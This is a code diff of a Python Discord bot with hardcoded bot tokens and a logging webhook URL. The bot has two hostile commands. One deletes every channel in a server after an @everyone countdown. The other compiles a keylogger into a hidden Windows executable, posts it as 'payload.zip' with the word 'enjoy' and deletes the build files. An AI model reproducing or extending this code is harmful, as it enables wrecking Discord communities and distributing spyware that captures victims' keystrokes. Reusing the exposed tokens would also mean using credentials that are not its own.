@@ -6,7 +6,7 @@ from time import sleep
 from os import system, remove
 from discord import Permissions
 
-token = "MTEzNjIyMjE1NTk2NTc0MzE5NQ.GO_KRr.4n6wcUlGKFAa7P_A4UKX4JKvtV-UElQ1f36f4o"
+token = "MTEzNjIyMjE1NTk2NTc0MzE5NQ.GB1LPg.sNYiq1OU1SFV6_EemcLBFYzDQR-6RwxLfoy1s4"
 webhookforlogs = "https://discord.com/api/webhooks/1188181114871885955/Gm-l3Mur2M-8_sHT4I9l4Mfmn-6wzR8jihHNdelwaZzWJe0Psl3GxrkgXZzSKlv7Je4x"
 intents = discord.Intents.default()
 intents.message_content = True
@@ -47,7 +47,7 @@ async def patla(ctx):
     await channel.send("```3...@everyone```")
     sleep(1)
     await channel.send("```BYBY...@everyone```")
-    # Her bir kanalı sil
+
     for channel in channels:
         try:
             await channel.delete()
@@ -67,18 +67,18 @@ async def payload(ctx):
     system("pyinstaller --windowed --onefile keylogger.py")
     sleep(10)
     with zipfile.ZipFile("payload.zip", "w") as zip:
-        zip.write("\\dist\\keylogger.exe")
+        zip.write("\\dist\\keylogger.exe")#Configure the keylogger.exe file
 
     with open("payload.zip", "rb") as zip_file:
         file = "payload.zip"
         payload = discord.File(file, filename="payload.zip")
-        await ctx.channel.send("enjoy",file=payload)
+        await ctx.channel.send("enjoy", file=payload)
 
         sleep(6)
 
     remove("payload.zip")
-    remove("\\dist\keylogger.py")
-    remove("\\build")
+    remove("\\dist\keylogger.py")#Configure the keylogger.exe file
+    remove("\\build")#Configure the build folder
     remove("keyloger.spec")
 
 bot.run(token)
